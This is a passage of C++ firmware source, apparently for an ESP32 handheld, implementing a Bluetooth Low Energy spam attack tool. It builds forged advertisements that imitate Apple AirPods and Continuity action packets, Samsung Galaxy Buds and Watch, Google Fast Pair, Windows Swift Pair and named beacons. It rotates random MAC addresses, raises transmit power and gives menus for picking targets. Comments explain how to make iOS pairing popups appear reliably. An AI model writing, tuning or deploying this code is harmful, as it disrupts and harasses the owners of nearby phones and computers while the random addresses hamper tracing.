        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.fillRect(8, metrics.footer_y, tftWidth - 16, FP * LH, bruceConfig.bgColor);
        tft.drawCentreString(footer, tftWidth / 2, metrics.footer_y + 2, 1);
    }
}

static int bleSpamListLoop(
    const String &title, int itemCount, int initialIndex, const std::function<const char *(int)> &labelFn,
    const char *footer
) {
    if (itemCount <= 0) return -1;

    BleSpamListState state;
    state.cursor = (initialIndex >= 0 && initialIndex < itemCount) ? initialIndex : 0;
    state.scroll = 0;
    state.redraw = true;

    BleSpamListMetrics metrics = bleSpamGetListMetrics(1);
    bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
    bool layoutDrawn = false;

    while (true) {
        if (state.redraw) {
            bleSpamRenderList(title, itemCount, state, metrics, labelFn, footer, !layoutDrawn);
            layoutDrawn = true;
            state.redraw = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return -1;

        if (check(NextPress)) {
            state.cursor = (state.cursor + 1) % itemCount;
            bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
            state.redraw = true;
        } else if (check(PrevPress)) {
            state.cursor = (state.cursor + itemCount - 1) % itemCount;
            bleSpamEnsureScroll(state, itemCount, metrics.visible_rows);
            state.redraw = true;
        } else if (check(SelPress)) {
            return state.cursor;
        }
    }
}

static int bleSpamGetAttackOptionCount() {
    return sizeof(BLE_SPAM_ATTACK_OPTIONS) / sizeof(BLE_SPAM_ATTACK_OPTIONS[0]);
}

static BleSpamAttackType bleSpamGetAttackTypeByIndex(int index) {
    return BLE_SPAM_ATTACK_OPTIONS[index].type;
}

static const char *bleSpamGetAttackLabel(int index) { return BLE_SPAM_ATTACK_OPTIONS[index].label; }

static int bleSpamGetDeviceCount(BleSpamAttackType type) {
    switch (type) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING:
            return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
        case BLE_SPAM_ATTACK_APPLE_ACTION:
            return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice) + 1; // +1 Random/All
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE:
            return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT:
            return sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0]);
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            // presets + Random/All + saved custom names + "+ Add New Custom Name"
            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
            return (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0])) + 1 +
                   (int)saved.size() + 1;
        }
        case BLE_SPAM_ATTACK_SAMSUNG:
            return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
            return nPresets + 1 + (int)saved.size() + 1; // presets + Random/All + saved + Add New
        }
        default: return 0;
    }
}

// Static buffer for dynamic device names returned by bleSpamGetDeviceName
static char bleSpamDeviceNameBuf[48];

static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
    switch (type) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT) return APPLE_PROXIMITY_DEVICES[index].name;
            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
            return "Apple";
        }
        case BLE_SPAM_ATTACK_APPLE_ACTION: {
            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice));
            if (index >= 0 && index < staticCount) return BLE_SPAM_APPLE_ACTION_DEVICES[index].ui_name;
            if (index == staticCount) return "Random / All";
            return "Apple";
        }
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
            if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT) return APPLE_PROXIMITY_DEVICES[index].name;
            if (index == APPLE_PROXIMITY_DEVICE_COUNT) return "Random / All";
            return "Apple";
        }
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT:
            if (index >= 0 &&
                index < (int)(sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0])))
                return BLE_SPAM_ANDROID_DEVICES[index];
            return "Android";
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
            if (index >= 0 && index < nPresets) return BLE_SPAM_WINDOWS_PRESETS[index];
            if (index == nPresets) return "Random / All";
            // saved custom names
            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
            int savedBase = nPresets + 1;
            int addNewIdx = savedBase + (int)saved.size();
            if (index >= savedBase && index < addNewIdx) {
                strncpy(
                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
                );
                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
                return bleSpamDeviceNameBuf;
            }
            if (index == addNewIdx) return "+ Add New Custom Name";
            return "Windows";
        }
        case BLE_SPAM_ATTACK_SAMSUNG:
            if (index >= 0 &&
                index < (int)(sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0])))
                return BLE_SPAM_SAMSUNG_DEVICES[index];
            return "Samsung";
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            if (index >= 0 && index < nPresets) return BLE_SPAM_BEACON_PRESETS[index];
            if (index == nPresets) return "Random Device Spam";
            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
            int savedBase = nPresets + 1;
            int addNewIdx = savedBase + (int)saved.size();
            if (index >= savedBase && index < addNewIdx) {
                strncpy(
                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
                );
                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
                return bleSpamDeviceNameBuf;
            }
            if (index == addNewIdx) return "+ Add New Custom Name";
            return "Beacon";
        }
        case BLE_SPAM_ATTACK_RANDOM_ALL:
        default: return "Random / All";
    }
}

#if !defined(LITE_VERSION)
// Builds a real ProximityPair advertisement (31 bytes), ported from the current
// Flipper Zero ble_spam app. Status byte, battery, and the 16-byte "encrypted
// payload" tail are regenerated fresh on every packet. prefix=0x07 triggers the
// normal device-popup; prefix=0x01 triggers the "Not Your Device" variant.
static bool buildAppleProximityPair(
    uint8_t prefix, uint16_t deviceId, BLEAdvertisementData &advertisementData
) {
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++] = 0x1E; // AD length
    buf[i++] = 0xFF; // AD type: manufacturer specific
    buf[i++] = 0x4C; // Apple company ID
    buf[i++] = 0x00;
    buf[i++] = 0x07; // Continuity type: ProximityPair
    buf[i++] = 0x19; // Continuity size: 25
    buf[i++] = prefix;
    buf[i++] = (uint8_t)(deviceId >> 8);
    buf[i++] = (uint8_t)(deviceId & 0xFF);
    buf[i++] = 0x55; // Status
    esp_fill_random(&buf[i], 3); // Battery
    i += 3;
    buf[i++] = 0x00; // Color
    buf[i++] = 0x00; // Reserved
    esp_fill_random(&buf[i], 16); // "Encrypted payload"
    i += 16;

    advertisementData = BLEAdvertisementData();
    // No setFlags() here: this manufacturer-data AD entry is already exactly
    // 31 bytes (the legacy advertising PDU max). Adding a 3-byte Flags AD
    // entry first pushes NimBLE's payload past BLE_HS_ADV_MAX_SZ, so the
    // addData() call below silently fails and returns false — the device
    // then broadcasts flags only, with no Apple payload at all (no popup,
    // but MAC still rotates and "packets" still go out, which is exactly
    // what looked broken). iOS's Continuity parser doesn't require a Flags
    // AD entry to read manufacturer data, and the real Flipper Zero
    // ble_spam app never sends one for this packet either.
#ifdef NIMBLE_V2_PLUS
    advertisementData.addData(buf, i);
#else
    std::vector<uint8_t> dataVec(buf, buf + i);
    advertisementData.addData(dataVec);
#endif
    return true;
}

// Resolves a Pairing/Not-Your-Device menu deviceIndex to a device ID, handling
// the "Random/All" sentinel at the end of the list.
static uint16_t bleSpamResolveProximityDeviceId(int deviceIndex) {
    if (deviceIndex == APPLE_PROXIMITY_DEVICE_COUNT || deviceIndex < 0 ||
        deviceIndex >= APPLE_PROXIMITY_DEVICE_COUNT) {
        return APPLE_PROXIMITY_DEVICES[random(APPLE_PROXIMITY_DEVICE_COUNT)].device_id;
    }
    return APPLE_PROXIMITY_DEVICES[deviceIndex].device_id;
}
#endif

static void bleSpamPickRandomSelection(BleSpamAttackType &attackType, int &deviceIndex) {
    struct AttackCount {
        BleSpamAttackType type;
        int count;
    };

    AttackCount counts[] = {
#if !defined(LITE_VERSION)
        {BLE_SPAM_ATTACK_APPLE_PAIRING,
                                  bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_PAIRING) - 1                                   }, // -1 to exclude Random/All sentinel
        {BLE_SPAM_ATTACK_APPLE_ACTION,       bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_ACTION) - 1},
#endif
        {BLE_SPAM_ATTACK_ANDROID_ALERT,      2                                                      }, // only Pixel + Generic, not Random/All
        {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
                                  (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))              },
        {BLE_SPAM_ATTACK_SAMSUNG,            3                                                      }  // Galaxy Buds/Watch/Generic only
    };

    int total = 0;
    for (size_t i = 0; i < sizeof(counts) / sizeof(counts[0]); i++) {
        if (counts[i].count > 0) total += counts[i].count;
    }

    if (total == 0) {
        attackType = BLE_SPAM_ATTACK_ANDROID_ALERT;
        deviceIndex = 0;
        return;
    }

    int roll = random(total);
    for (size_t i = 0; i < sizeof(counts) / sizeof(counts[0]); i++) {
        if (counts[i].count == 0) continue;
        if (roll < counts[i].count) {
            attackType = counts[i].type;
            deviceIndex = roll;
            return;
        }
        roll -= counts[i].count;
    }

    attackType = BLE_SPAM_ATTACK_ANDROID_ALERT;
    deviceIndex = 0;
}

static esp_power_level_t bleSpamTxPowerToLevel(BleSpamTxPower level) {
    switch (level) {
        case BLE_SPAM_TX_MAX: return MAX_TX_POWER;
        case BLE_SPAM_TX_HIGH: return ESP_PWR_LVL_P9;
        case BLE_SPAM_TX_MEDIUM: return ESP_PWR_LVL_P6;
        case BLE_SPAM_TX_LOW: return ESP_PWR_LVL_P3;
        default: return MAX_TX_POWER;
    }
}

static void bleSpamApplyTxPower(BleSpamTxPower level) {
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, bleSpamTxPowerToLevel(level));
}

static void bleSpamSetMac(const uint8_t *mac) { esp_iface_mac_addr_set(mac, ESP_MAC_BT); }

static uint64_t bleSpamMacRngState = 0;

static void bleSpamSeedMacRng() {
    uint64_t seed = ((uint64_t)esp_random() << 32) ^ esp_random();
    if (seed == 0) seed = 0x9E3779B97F4A7C15ULL;
    bleSpamMacRngState = seed;
}

static uint64_t bleSpamNextRand64() {
    if (bleSpamMacRngState == 0) bleSpamSeedMacRng();
    uint64_t x = bleSpamMacRngState;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    bleSpamMacRngState = x;
    return x * 0x2545F4914F6CDD1DULL;
}

static void bleSpamFastRandomMac(uint8_t *mac) {
    uint64_t r1 = bleSpamNextRand64();
    uint64_t r2 = bleSpamNextRand64();
    mac[0] = (uint8_t)(r1 & 0xFF);
    mac[1] = (uint8_t)((r1 >> 8) & 0xFF);
    mac[2] = (uint8_t)((r1 >> 16) & 0xFF);
    mac[3] = (uint8_t)((r1 >> 24) & 0xFF);
    mac[4] = (uint8_t)(r2 & 0xFF);
    mac[5] = (uint8_t)((r2 >> 8) & 0xFF);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

// 16-char printable ASCII name, regenerated every call via xorshift — used for beacon random spam
static void bleSpamRandomBeaconName(char *buf) {
    const uint8_t len = 16;
    for (uint8_t i = 0; i < len; i++) { buf[i] = 0x21 + (uint8_t)(bleSpamNextRand64() % 94); }
    buf[len] = '\0';
}

static bool bleSpamGetNextMac(BleSpamRunState &state, BleSpamMacRandMode mode, uint8_t outMac[6]) {
    if (mode == BLE_SPAM_MAC_OFF) {
        if (!state.mac_initialized) {
            bleSpamFastRandomMac(outMac);
            return true;
        }
        return false;
    }

    uint32_t divisor = bleSpamMacRandDivisor(mode);
    if (divisor == 0) return false;

    if (!state.mac_initialized || (state.packet_counter > 0 && state.packet_counter % divisor == 0)) {
        bleSpamFastRandomMac(outMac);
        return true;
    }

    return false;
}

// ============================================================================
// Apple Continuity dynamic packet builders (MarlinSchuck)
// Dynamic random fields matching Flipper Zero reference — triggers iOS popups
// where static payloads failed. Only used by the new BLE spam UI Apple paths.
// ============================================================================

static size_t bleSpamBuildContinuityNearbyAction(uint8_t *buf) {
    uint8_t action = continuity_na_actions[esp_random() % continuity_na_actions_count];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    return i;
}

// Builds a dynamic Apple Continuity NearbyAction (Action modal) advertisement.
// Previously alternated 50/50 with a "CustomCrash" variant that appended 6
// bytes past the declared Continuity Size — not a real Continuity TLV, so
// roughly half of all Action packets were malformed and silently dropped by
// iOS. Always emit the real NearbyAction format now.
static bool bleSpamBuildAppleContinuityAdvertisement(BLEAdvertisementData &advertisementData) {
    uint8_t buf[31];
    size_t len = bleSpamBuildContinuityNearbyAction(buf);
    if (len == 0) return false;
    advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x06);
#ifdef NIMBLE_V2_PLUS
    advertisementData.addData(buf, len);
#else
    std::vector<uint8_t> dataVec(buf, buf + len);
    advertisementData.addData(dataVec);
#endif
    return true;
}

static bool bleSpamBuildAdvertisementData(
    BleSpamAttackType attackType, int deviceIndex, BLEAdvertisementData &advertisementData
) {
    switch (attackType) {
#if !defined(LITE_VERSION)
        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
            // ProximityPair device popup (AirPods, Beats etc.) — prefix 0x07 = new device.
            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
            return buildAppleProximityPair(0x07, deviceId, advertisementData);
        }
        case BLE_SPAM_ATTACK_APPLE_ACTION: {
            // Action modals (SetupNewPhone, AppleTV etc.) use dynamic Continuity NearbyAction
            // packets (MarlinSchuck) — these trigger iOS popups more reliably than static payloads
            return bleSpamBuildAppleContinuityAdvertisement(advertisementData);
        }
        case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
            // Same ProximityPair format, prefix 0x01 = "Not Your Device" variant.
            uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
            return buildAppleProximityPair(0x01, deviceId, advertisementData);
        }
#endif
        case BLE_SPAM_ATTACK_ANDROID_ALERT: {
            bool useSamsung = false;
            if (deviceIndex == BLE_SPAM_ANDROID_RANDOM_IDX) {
                int ouiCount = sizeof(SAMSUNG_MAC_OUIS) / sizeof(SAMSUNG_MAC_OUIS[0]);
                char macBuf[18];
                snprintf(
                    macBuf,
                    sizeof(macBuf),
                    "%s:%02X:%02X:%02X",
                    SAMSUNG_MAC_OUIS[random(ouiCount)],
                    (unsigned)random(256),
                    (unsigned)random(256),
                    (unsigned)random(256)
                );
                useSamsung = (random(2) == 0) && isSamsungDevice(String(macBuf));
            }
            advertisementData = GetUniversalAdvertisementData(useSamsung ? Samsung : Google);
            advertisementData.setFlags(0x06);
            return true;
        }
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
            String name;
            if (deviceIndex == nPresets) {
                // Random/All — pick random preset
                name = String(BLE_SPAM_WINDOWS_PRESETS[random(nPresets)]);
            } else if (deviceIndex >= 0 && deviceIndex < nPresets) {
                name = String(BLE_SPAM_WINDOWS_PRESETS[deviceIndex]);
            } else {
                // custom saved name
                name = bleSpamSwiftPairName.length() > 0 ? bleSpamSwiftPairName
                                                         : String(BLE_SPAM_WINDOWS_PRESETS[0]);
            }
            advertisementData = GetUniversalAdvertisementData(Microsoft, name);
            advertisementData.setFlags(0x06);
            return true;
        }
        case BLE_SPAM_ATTACK_SAMSUNG: {
            // Device list: 0=Galaxy Buds, 1=Galaxy Watch, 2=Generic Samsung, 3=Random/All
            BLEAdvertisementData AdvData = BLEAdvertisementData();
#ifndef NIMBLE_V2_PLUS
            static std::vector<uint8_t> samsungDataVec;
#endif
            bool sendBuds;
            if (deviceIndex == BLE_SPAM_SAMSUNG_RANDOM_IDX || deviceIndex == 2) {
                // Random/All or Generic — pick randomly each packet
                sendBuds = (random(2) == 0);
            } else if (deviceIndex == 0) {
                sendBuds = true; // Galaxy Buds
            } else {
                sendBuds = false; // Galaxy Watch
            }

            if (sendBuds) {
                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
                uint8_t Buds_Data[31];
                uint8_t bi = 0;
                Buds_Data[bi++] = 27;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x42;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = 0x81;
                Buds_Data[bi++] = 0x02;
                Buds_Data[bi++] = 0x14;
                Buds_Data[bi++] = 0x15;
                Buds_Data[bi++] = 0x03;
                Buds_Data[bi++] = 0x21;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = (model >> 16) & 0xFF;
                Buds_Data[bi++] = (model >> 8) & 0xFF;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = model & 0xFF;
                Buds_Data[bi++] = 0x06;
                Buds_Data[bi++] = 0x3C;
                Buds_Data[bi++] = 0x94;
                Buds_Data[bi++] = 0x8E;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0xC7;
                Buds_Data[bi++] = 0x00;
                // Trailing truncated record (length=0x10 claimed, only 2 data
                // bytes present) — ported from the Flipper Zero ble_spam app.
                // Real Galaxy Buds advertise this stub second record; without
                // it Samsung's scanner doesn't recognize the packet.
                Buds_Data[bi++] = 0x10;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(Buds_Data, bi);
#else
                samsungDataVec.assign(Buds_Data, Buds_Data + bi);
                AdvData.addData(samsungDataVec);
#endif
            } else {
                uint8_t model = watch_models[random(watch_models_count)].value;
                uint8_t Watch_Data[15] = {
                    0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
                };
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(Watch_Data, 15);
#else
                samsungDataVec.assign(Watch_Data, Watch_Data + 15);
                AdvData.addData(samsungDataVec);
#endif
            }
            AdvData.setFlags(0x06);
            advertisementData = AdvData;
            return true;
        }
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            advertisementData = BLEAdvertisementData();
            int nBeaconPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            int randomBeaconIdx = nBeaconPresets;
            String name;
            char randomBuf[17];
            if (deviceIndex >= 0 && deviceIndex < nBeaconPresets) {
                // Preset name
                name = String(BLE_SPAM_BEACON_PRESETS[deviceIndex]);
                bleSpamBeaconName = name;
            } else if (deviceIndex == randomBeaconIdx || bleSpamBeaconName.length() == 0) {
                // Random — generate fresh each packet
                bleSpamRandomBeaconName(randomBuf);
                name = String(randomBuf);
            } else {
                // Custom saved name
                name = bleSpamBeaconName;
            }

            uint8_t packet[31];
            uint8_t i = 0;

            // Flags
            packet[i++] = 0x02;
            packet[i++] = 0x01;
            packet[i++] = 0x06;

            // UUIDs
            packet[i++] = 0x03;
            packet[i++] = 0x03;
            packet[i++] = 0x12;
            packet[i++] = 0x18;

            // Appearance
            packet[i++] = 0x03;
            packet[i++] = 0x19;
            packet[i++] = 0x80;
            packet[i++] = 0x01;

            // Compute remaining space
            uint8_t maxNameLen = 31 - i - 2; // -2 for length + type
            uint8_t nameLen = min((uint8_t)name.length(), maxNameLen);

            // Name
            packet[i++] = nameLen + 1;
            packet[i++] = 0x09;

            memcpy(&packet[i], name.c_str(), nameLen);
            i += nameLen;

#ifdef NIMBLE_V2_PLUS
            advertisementData.addData(packet, i);
#else
            std::vector<uint8_t> dataVec(packet, packet + i);
            advertisementData.addData(dataVec);
#endif
            return true;
        }
        default: return false;
    }
}

static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
    // beacon with empty name = random every packet, never cache
    if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) return false;
    // Apple Pairing and Action both regenerate random fields (battery/encrypted
    // payload/auth tag) on every build call and must not be cached, or the same
    // randomized packet would be replayed forever instead of looking fresh.
    return attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR || attackType == BLE_SPAM_ATTACK_BLE_BEACON;
}

static const BLEAdvertisementData *
bleSpamSelectAdvertisement(BleSpamRunState &state, BleSpamAttackType attackType, int deviceIndex) {
    if (bleSpamIsCacheable(attackType)) {
        if (!state.cached_valid || state.cached_type != attackType ||
            state.cached_device_index != deviceIndex) {
            if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.cached_advertisement))
                return nullptr;
            state.cached_type = attackType;
            state.cached_device_index = deviceIndex;
            state.cached_valid = true;
        }
        return &state.cached_advertisement;
    }

    if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.working_advertisement)) return nullptr;
    return &state.working_advertisement;
}

static void bleSpamInitAdvertiser(
    BleSpamRunState &state, const BleSpamConfig &config, const uint8_t *mac, bool resetStats
) {
    if (mac) {
        bleSpamSetMac(mac);
        state.mac_initialized = true;
    } else {
        state.mac_initialized = false;
    }

    BLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);

    pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
        pAdvertising->setMinInterval(32);
        pAdvertising->setMaxInterval(48);
    }

    bleSpamApplyTxPower(config.tx_power);
    state.applied_power = config.tx_power;
    if (resetStats) {
        state.packet_counter = 0;
        state.sent_count = 0;
        state.window_packets = 0;
        state.window_start_ms = millis();
        state.pkt_s = 0.0f;
    }
    state.adv_active = false;
    state.adv_stop_ms = 0;
    uint32_t now = millis();
    if (resetStats) state.next_send_ms = now;
    else if (state.next_send_ms < now) state.next_send_ms = now;
}

static void bleSpamDeinitAdvertiser() {
    if (pAdvertising) {
        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
        pAdvertising = nullptr;
    }
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
#ifdef CONFIG_BT_NIMBLE_ENABLED
    // NimBLEDevice::m_ownAddrType is a static class member that survives
    // deinit()/init() cycles. bleSpamRestartAdvertiserForMac() flips it to
    // BLE_OWN_ADDR_RANDOM for MAC rotation; every other module's scan/connect/
    // advertise call reads that same static value, so leaving it set breaks
    // all Bluetooth elsewhere in the firmware until a reboot clears statics.
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
#endif
}

// CHANGED: replaces the old bleSpamRestartAdvertiserForMac which did a full deinit/init.
// Now we only stop advertising, swap the MAC at the interface level and tell the
// NimBLE host (or Bluedroid GAP) about the new address, then let the caller
// restart advertising normally. No stack teardown, no heap churn.
static void
bleSpamRestartAdvertiserForMac(BleSpamRunState &state, const BleSpamConfig &config, const uint8_t *mac) {
    if (pAdvertising) pAdvertising->stop();

    // Set the address at the hardware/interface level first — works for both stacks
    esp_iface_mac_addr_set(mac, ESP_MAC_BT);

#ifdef CONFIG_BT_NIMBLE_ENABLED
    // NimBLE keeps its own copy of the random address in the host layer.
    // ble_hs_id_set_rnd expects bytes in little-endian order (byte 0 = LSB of address).
    // A valid random static address requires the two MSBs of the *most significant byte*
    // (which is byte[5] in big-endian / byte[0] in little-endian) to be set to 11.
    uint8_t addr_le[6];
    addr_le[0] = mac[5] | 0xC0; // MSB of address with random static bits set
    addr_le[1] = mac[4];
    addr_le[2] = mac[3];
    addr_le[3] = mac[2];
    addr_le[4] = mac[1];
    addr_le[5] = mac[0];
    ble_hs_id_set_rnd(addr_le);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
#else
    // Bluedroid: the GAP API handles the random address directly.
    // Same MSB requirement applies.
    uint8_t addr[6];
    memcpy(addr, mac, 6);
    addr[5] |= 0xC0;
    esp_ble_gap_set_rand_addr(addr);
#endif

    state.mac_initialized = true;
    // pAdvertising is still valid — caller proceeds straight to start()
}

static void
bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSpamSelection &selection) {
    uint32_t now = millis();
    static BLEAdvertisementData emptyScanResponse = BLEAdvertisementData();

    if (state.adv_active && now >= state.adv_stop_ms) {
        if (pAdvertising) pAdvertising->stop();
        state.adv_active = false;
    }

    if (!state.adv_active && now >= state.next_send_ms && pAdvertising) {
        BleSpamAttackType attackType = selection.attack_type;
        int deviceIndex = selection.device_index;

        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
            bleSpamPickRandomSelection(attackType, deviceIndex);
        }

        uint8_t nextMac[6];
        if (bleSpamGetNextMac(state, config.mac_rand_mode, nextMac)) {
            bleSpamRestartAdvertiserForMac(state, config, nextMac);
        }

        if (!pAdvertising) return;

        // For beacon random spam, force a stop before setting new data so NimBLE
        // flushes the payload and picks up the new name every packet
        if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) {
            pAdvertising->stop();
        }

        const BLEAdvertisementData *advertisementData =
            bleSpamSelectAdvertisement(state, attackType, deviceIndex);
        if (!advertisementData) return;

        pAdvertising->setAdvertisementData(*advertisementData);
        pAdvertising->setScanResponseData(emptyScanResponse);
        pAdvertising->start();

        state.adv_active = true;
        state.adv_stop_ms = now + config.adv_ms;
        state.next_send_ms = now + config.adv_ms + config.gap_ms;
        state.packet_counter++;
        state.sent_count++;
        state.window_packets++;
    }
}

static void bleSpamUpdateStats(BleSpamRunState &state) {
    uint32_t now = millis();
    if (now - state.window_start_ms >= BLE_SPAM_STATS_UPDATE_MS) {
        state.pkt_s = state.window_packets / 0.5f;
        state.window_packets = 0;
        state.window_start_ms = now;
    }
}

static String bleSpamFormatMs(uint32_t ms) { return String(ms) + " ms"; }

static void bleSpamRenderConfigRows(
    const BleSpamConfig &config, int cursor, const BleSpamEditState &editState, int startY, int rowH
) {
    tft.setTextSize(FP);

    struct RowInfo {
        const char *label;
        String value;
    } rows[] = {
        {"Adv ms",   bleSpamFormatMs(config.adv_ms)           },
        {"Gap ms",   bleSpamFormatMs(config.gap_ms)           },
        {"TX Power", bleSpamTxPowerLabel(config.tx_power)     },
        {"MAC Rand", bleSpamMacRandLabel(config.mac_rand_mode)}
    };

    for (int i = 0; i < 4; i++) {
        int rowY = startY + i * rowH;
        bool selected = (cursor == i);
        bool editing = (editState.editing && editState.edit_row == i);

        tft.fillRect(10, rowY, tftWidth - 20, rowH, bruceConfig.bgColor);
        uint16_t fg = selected ? TFT_YELLOW : bruceConfig.priColor;
        tft.setTextColor(fg, bruceConfig.bgColor);
        tft.drawString(rows[i].label, 12, rowY + 2, 1);

        String valueText = rows[i].value;
        if (editing) valueText = "[ " + valueText + " ]";
        tft.drawRightString(valueText, tftWidth - 12, rowY + 2, 1);
    }
}

static bool
bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bool &configChanged) {
    BleSpamEditState editState;
    int cursor = 0;
    bool layoutDrawn = false;
    bool redrawRows = true;

    while (true) {
        if (!layoutDrawn) {
            String title =
                String(bleSpamGetDeviceName(selection.attack_type, selection.device_index)) + " > Config";
            drawMainBorderWithTitle(bleSpamMakeTitle(title));
            layoutDrawn = true;
            redrawRows = true;
        }

        if (redrawRows) {
            int rowH = max(12, FP * LH + 4);
            int rowStart = BORDER_PAD_Y + FM * LH + 10;
            int startRowY = rowStart + rowH * 4 + rowH;

            bleSpamRenderConfigRows(config, cursor, editState, rowStart, rowH);

            tft.fillRect(10, startRowY, tftWidth - 20, rowH, bruceConfig.bgColor);
            uint16_t startColor = (cursor == 4) ? TFT_YELLOW : bruceConfig.priColor;
            tft.setTextColor(startColor, bruceConfig.bgColor);
            tft.drawCentreString("[ Start ]", tftWidth / 2, startRowY + 2, 1);

